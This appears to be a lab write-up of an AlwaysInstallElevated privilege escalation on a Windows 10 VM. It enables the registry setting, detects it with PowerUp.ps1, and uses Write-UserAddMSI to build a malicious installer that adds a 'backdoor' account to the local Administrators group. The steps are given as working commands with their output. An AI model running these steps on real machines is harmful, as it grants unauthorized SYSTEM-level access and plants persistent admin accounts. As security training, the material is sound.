# AlwaysInstallElevated Exploitation — Steps Summary

**Machine used:** 1 Windows 10 VM (Administrator access)
**Tools used:** PowerShell, PowerUp.ps1

---

## Step 1: Create the registry-enabling script
Wrote `Enable-AlwaysInstallElevated.ps1` (see attached file), which:
1. Ensures the `Installer` registry key exists under both `HKLM` and `HKCU`
   (created manually with `New-Item` since it did not exist by default)
2. Sets the `AlwaysInstallElevated` DWORD value to `1` under:
   - `HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer`
   - `HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer`

---

## Step 2: Execute the script
```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
cd C:\Users\nahla\Desktop
.\Enable-AlwaysInstallElevated.ps1
```
**Output:** `AlwaysInstallElevated has been enabled for both HKLM and HKCU.`

**Verified with:**
```powershell
Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
```
Confirmed: `AlwaysInstallElevated : 1`

---

## Step 3: Identify the vulnerability with PowerUp.ps1
```powershell
Unblock-File -Path .\PowerUp.ps1
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```
**Output:** `True` — confirming PowerUp.ps1 successfully detected the AlwaysInstallElevated misconfiguration.

---

## Step 4: Exploit the vulnerability
```powershell
Write-UserAddMSI
```
Generated `UserAdd.msi`, a malicious installer that, due to the AlwaysInstallElevated setting, runs with SYSTEM privileges regardless of the installing user's actual permission level.

```powershell
.\UserAdd.msi
```
This launched a GUI prompting for Username, Password, and Group. Entered:
- Username: `backdoor`
- Password: `password123`
- Group: `Administrators`

Clicked **Create** to complete the installation.

---

## Step 5: Validate the privilege escalation
```powershell
net user
```
Confirmed the `backdoor` account exists on the system.

```powershell
net localgroup administrators
```
Confirmed `backdoor` is listed as a member of the local Administrators group — proving successful privilege escalation via the AlwaysInstallElevated vulnerability.

---
```
